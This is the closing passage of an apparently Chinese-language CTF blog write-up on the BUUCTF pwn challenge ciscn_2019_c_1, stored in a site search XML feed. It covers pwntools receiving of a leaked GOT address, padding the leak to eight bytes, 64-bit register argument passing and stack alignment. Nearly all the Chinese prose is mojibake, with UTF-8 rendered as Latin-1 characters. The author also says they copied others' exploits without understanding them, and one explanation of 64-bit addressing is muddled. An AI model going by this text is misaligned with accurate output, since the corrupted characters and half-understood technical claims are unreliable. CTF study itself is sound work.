<p>recvline()ä¸€æ¬¡æ¥æ”¶åˆ°\n;<br>ç¬¬ä¸€æ¬¡recvlineåªèƒ½åˆ°Ciphertextï¼›<br>ç¬¬äºŒæ¬¡åªèƒ½æ¥æ”¶åˆ°0a<br>ç¬¬ä¸‰æ¬¡çš„recvuntilæ‰å¼€å§‹å¤„ç†æ³„éœ²çš„gotåœ°å€ã€‚<br>å…ˆå¼€ä¸€ä¸‹context_log_lever&#x3D;â€™debugâ€™ï¼Œæ•´ä½“çœ‹ä¸€ä¸‹ï¼Œ å†è‡ªå·±recvuntilçœ‹èƒ½æ¥æ”¶åˆ°ä»€ä¹ˆå†…å®¹ã€‚</p>
</blockquote>
<p>ç„¶åå†ç”¨recvuntil(â€˜\nâ€™)[:-1].ljust(8,â€™\0â€™)æ¥èˆå¼ƒæ¥æ”¶åˆ°çš„å­—ç¬¦ä¸²æœ€åçš„â€™\x0â€™å¹¶å‘å·¦è¡¥é½</p>
<p>è¿˜æœ‰<br>è¿™ä¸€é“é¢˜æ˜¯64ä½çš„ç¨‹åºï¼Œè¿™è¾¹æ¶‰åŠåˆ°64ä½ç¨‹åºå’Œ32ä½ç¨‹åºè¿è¡Œæ—¶çš„åŒºåˆ«äº†<br>32ä½ç¨‹åºè¿è¡Œæ‰§è¡ŒæŒ‡ä»¤çš„æ—¶å€™ç›´æ¥å»å†…å­˜åœ°å€å¯»å€æ‰§è¡Œ<br>64ä½ç¨‹åºåˆ™æ˜¯é€šè¿‡å¯„å­˜å™¨æ¥ä¼ å€ï¼Œå¯„å­˜å™¨å»å†…å­˜å¯»å€ï¼Œæ‰¾åˆ°åœ°å€è¿”å›ç»™ç¨‹åº<br>å› æ­¤è¦ç”¨å¯„å­˜å™¨å­˜å‚<br>ï¼ˆä¸ºä»€ä¹ˆå‘¢ï¼Ÿï¼Ÿè¿˜æ˜¯ä¸ç†è§£å•Šï¼‰<br><img data-src="https://pic2.zhimg.com/80/v2-64d98b53873c335d7f889b202b92fb9d_1440w.webp"></p>
<p>æ³¨æ„æ ˆå¯¹é½<br><img data-src="https://pic1.zhimg.com/80/v2-5fb909989f2a46201c004e96d46f6890_1440w.webp"><br>è™½ç„¶æˆ‘ä¸æ‡‚ä¸ºä»€ä¹ˆè¦â€¦â€¦</p>
<p>è¿˜æœ‰<br>æœ€åä¸ºä»€ä¹ˆè¿˜è¦å†è¾“ä¸€ä¸ª0å‘¢ï¼Ÿ</p>
<p><img data-src="https://pic2.zhimg.com/80/v2-ffa2e57740c5b5b7047a9a03f3183039_1440w.webp"></p>
<p>æä¸æ‡‚äº†    <strong>æ±‚åŠ©</strong></p>
<p>å…¶å®åšè¿™é¢˜ä¸»è¦è¿˜æ˜¯æ¨¡ä»¿å¤§ä½¬ä»¬å†™çš„expï¼Œå¥½å¤šç»†èŠ‚éƒ½ä¸æ¸…æ¥šï¼Œä½†æ˜¯æ„Ÿè§‰åšäº†é‚£ä¹ˆä¹…åˆä¸èƒ½æ‰”åœ¨é‚£è¾¹ç­‰å®Œå…¨æ‡‚äº†å†å†™é¢˜è§£    <del>æ„Ÿè§‰å¥½æµªè´¹</del><br>è¿˜å¾—å†ç ”ç©¶å•Š </p>
<p>å‚è€ƒèµ„æ–™ï¼š<br>  <a href="http://t.csdn.cn/m6si5">[BUUCTF]PWN6â€”â€”ciscn_2019_c_1</a></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf BUUCTF</tag>
      </tags>
  </entry>
</search>
